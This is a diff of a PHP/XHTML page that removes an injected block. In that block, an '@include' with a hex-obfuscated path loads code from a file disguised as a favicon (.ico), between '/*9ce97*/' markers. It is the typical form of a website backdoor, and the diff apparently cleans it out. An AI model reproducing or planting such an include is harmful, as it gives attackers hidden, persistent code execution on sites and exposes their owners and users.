@@ -1,14 +1,3 @@
-<?php
-/*9ce97*/
-
-@include "\x2fho\x6de/\x6dek\x61/p\x75bl\x69c_\x68tm\x6c/r\x75s/\x69ma\x67e/\x66av\x69co\x6e_a\x36bb\x663.\x69co";
-
-/*9ce97*/
-
-
-
-?>
-
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
